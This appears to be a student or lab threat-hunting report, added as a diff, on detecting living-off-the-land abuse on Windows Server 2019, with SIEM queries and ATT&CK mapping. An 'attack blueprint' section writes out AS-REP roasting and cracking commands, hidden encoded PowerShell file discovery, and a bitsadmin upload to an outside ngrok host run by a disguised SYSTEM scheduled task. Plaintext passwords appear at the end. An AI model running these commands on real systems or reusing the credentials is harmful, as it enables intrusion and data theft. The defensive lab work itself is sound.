@@ -1,0 +1,232 @@
+Threat Hunting Report: Detecting Stealthy
+Administrative Tool Abuse
+1. Executive Summary
+This project simulates a sophisticated attack on a Windows Server 2019 environment. Instead of
+common high-noise methods, the attack leverages "Living off the Land" (LotL) techniques—
+using legitimate Windows components like Kerberos, PowerShell, and BITS (Background
+Intelligent Transfer Service) to achieve objectives. The hunt proves that while these actions
+mimic normal administration, they leave unique forensic footprints in the SIEM that can be used
+to reconstruct the kill chain.
+
+2. Environment Setup
+
+
+
+
+Victim: Windows Server 2019 (Active Directory).
+Attacker: Kali Linux
+SIEM: Elastic Stack collecting:
+o Windows Security Logs: Kerberos and Task Scheduler events.
+o Sysmon: Process creation and network telemetry.
+o PowerShell Logs: Script Block Logging (Event ID 4104).
+
+3. Attack Simulation
+
+Phase
+
+Technique
+
+Execution Detail
+
+Initial
+Access
+
+AS-REP
+Roasting
+
+Captured Kerberos tickets for accounts without preauthentication required.
+
+Execution
+
+Encoded
+PowerShell
+
+Executed discovery scripts for .kdbx (KeePass) and
+.bak (Backup) files using Base64 obfuscation.
+
+Persistence
+
+Scheduled
+Task
+
+Created a hidden task AnalyzeData masquerading as
+a system diagnostic tool.
+
+Defense
+Evasion
+
+Exfiltration
+
+MasqueradingNamed the task "CertValidation" to blend
+in
+
+Scheduled
+BITS Job
+
+Used bitsadmin to exfiltrate update.zip at 02:00
+AM to the attacker machine.
+
+4. Threat Hunting Methodology
+The hunt was conducted using a hypothesis-driven approach, relying exclusively on SIEM data.
+Hypothesis 1: Credential Abuse
+
+
+
+Logic: Attackers will use valid accounts to avoid "Account Lockout" alerts14.
+Evidence: Look for Event ID 4768 (Kerberos TGT) where Pre-Auth is disabled.
+
+Hypothesis 2: Obfuscated PowerShell Execution
+
+
+
+Logic: Malicious scripts will be encoded to hide intent 15.
+Evidence: Filter Event ID 4104 (PowerShell) for strings containing Enc, JAB, or SUY
+
+5. Evidence & SIEM Queries
+To confirm the attack timeline, the following queries were used:
+Detecting Encoded PowerShell (Sysmon/Security):
+SQL:
+index=windows_logs EventCode=4104
+| eval length=len(ScriptBlockText)
+
+| where length > 100 AND (ScriptBlockText LIKE "%-Enc%" OR ScriptBlockText LIKE "%EncodedCommand%")
+
+Detecting BITS Exfiltration (Network/Sysmon):
+SQL:
+index=sysmon EventID=1 Image="*bitsadmin.exe*"
+| stats count by CommandLine, User, DestinationIP
+
+6. MITRE ATT&CK Mapping
+
+
+
+
+
+T1558.004: AS-REP Roasting (Credential Access)
+T1059.001: PowerShell (Execution)
+T1053.005: Scheduled Task (Persistence)
+T1197: BITS Jobs (Exfiltration)
+
+7. New Detection Use Case
+Use Case Name: Unusual LOLBin Network Communication. Description: Alerts when signed
+Windows binaries (certutil.exe, bitsadmin.exe, vssadmin.exe) initiate a network
+connection to a non-internal IP address. Recommendation: Implement a whitelist of approved
+Microsoft update domains to reduce false positives.
+
+ATTACK BLUEPRINT:
+-Detailed Attack Timeline
+This timeline reconstructs the incident based on the logs identified during the hunt:
+
+
+
+
+
+
+
+T+00:00 (Initial Access): Attacker performs AS-REP Roasting from Kali Linux. No
+failed logon logs are generated, but Event ID 4768 shows a TGT request without preauthentication.
+T+00:15 (Execution): Attacker logs in via WinRM/RDP and executes a Base64 encoded
+script to survey the system. PowerShell Event ID 4104 captures the de-obfuscated script
+block.
+T+00:30 (Persistence): A scheduled task named "SystemUpdate" is created to execute
+the payload daily. Security Event ID 4698 records the task creation.
+T+00:45 (Exfiltration): Sensitive files are compressed and moved using
+bitsadmin.exe. DNS/Network logs show a high volume of requests to the attacker's IP
+
+Initial Access :
+User name list:
+
+
+
+
+
+
+Administrator
+Admin
+Guest
+SQLAdmin
+ServiceAccount
+
+To execute an AS-REP Roasting:
+
+1- Request the AS-REP Hash
+impacket-GetNPUsers ooc.local/ -usersfile username.txt -format hashcat -dc-ip 192.168.134.85
+
+Offline Password Cracking
+john --wordlist=passwords.txt --format=krb5asrep hash.txt
+
+RESULT: name: jaber
+
+password:
+
+Execution “who am I & looking for gold”: (PowerShell abuse)
+Step 1: Prepare the PowerShell Script and Encode the Command in Kali
+execute command using the Encoded PowerShell that will show me:
+#Check for Admin privileges
+# Targeted search for KeePass and Backup files
+#write the result to a “file”
+
+2 converts script into the UTF-16LE encoding Windows expects
+# On Kali:
+
+echo -n "Write-Host '--- Privilege Status ---';
+[Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent().IsInR
+ole([Security.Principal.WindowsBuiltInRole]::Administrator); Write-Host '--- Sensitive Files ---';
+Get-ChildItem -Path C:\ -Include *.kdbx, *.bak -Recurse -ErrorAction SilentlyContinue | SelectObject FullName" | iconv -t UTF-16LE | base64 -w 0
+3. Execution on Windows Server
+Run the encoded command using the -EncodedCommand (or -Enc) flag.
+powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Enc
+JABpAGQAPQBbAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AVwBpAG4A
+ZABvAHcAcwBJAGQAZQBuAHQAaQB0AHkAXQA6ADoARwBlAHQAQwB1AHIAcgBlAG4AdAAoACkAO
+wAkAHAAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwBlAGMAdQByAGkAdAB5AC4AUAByAGkA
+
+bgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAFAAcgBpAG4AYwBpAHAAYQBsACgAJABpAGQAK
+QA7ACQAcAAuAEkAcwBJAG4AUgBvAGwAZQAoAFsAUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbg
+BjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAEIAdQBpAGwAdABJAG4AUgBvAGwAZQBdADoAOgBB
+AGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByACkA >> pcheck.txt
+
+fine sensitive files path:
+powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Enc
+"VwByAGkAdABlAC0ASABvAHMAdAAgACIALQAtAC0AIABTAHQAYQByAHQAaQBuAGcAIABEAGkA
+cwBjAG8AdgBlAHIAeQAgAFQAZQBzAHQAIAAtAC0ALQAiADsAIABHAGUAdAAtAEMAaABpAGwAZA
+BJAHQAZQBtACAALQBQAGEAdABoACAAIgBFADoAIgAgAC0ASQBuAGMAbAB1AGQAZQAgACoALg
+BrAGQAYgB4ACwAKgAuAGIAYQBrACwAKgAuAHYAaABkAHgAIAAtAFIAZQBjAHUAcgBzAGUAIAAt
+AEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1A
+GUAIAB8ACAARgBvAHIARQBhAGMAaAAtAE8AYgBqAGUAYwB0ACAAewAgACQAXwAuAEYAdQBsA
+GwATgBhAG0AZQAgAH0A" >> discovery.txt
+
+The Execution: Scheduled Task for collecting data and
+1. The Exfiltration Script
+Kali ip : https://yoko-kilometrical-federico.ngrok-free.dev
+1-compress the file :
+Compress-Archive -Path "E:\WindowsImageBackup\WINOTH6RGRFFNA\Logs\Backup_Error-30-12-2025*" -DestinationPath
+"C:\Users\Public\update.zip" –Force
+
+we create a small script that will be executed by the scheduled task. This script starts the BITS
+transfer.
+Set-Content -Path "C:\Users\Public\exfil.ps1" -Value 'bitsadmin /transfer "LogUpload" /upload /priority
+high https://yoko-kilometrical-federico.ngrok-free.dev/update.zip C:\Users\Public\update.zip'
+
+2. Creating the Scheduled Task
+We will now use schtasks.exe to create a task that triggers this script. To remain stealthy, we
+will place it in a sub-folder of the Task Scheduler that looks legitimate (like
+Microsoft\Windows\CertificateServices\CertValidation
+
+schtasks /create /tn "Microsoft\Windows\CertificateServices\CertValidation" /tr
+"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File
+C:\Users\Public\exfil.ps1" /sc minute /mo 5 /ru "SYSTEM" /f
+we create a small script that will be executed by the scheduled task. This script starts the BITS
+transfer.
+
+Note:
+-Machine:
+jaber
+P@ssw0rd123
+-ELK:
+
+sarolta@gmailot.com
+Makin4a10vitesse
+
+-To open RDP on linux: “remmina”
+
+
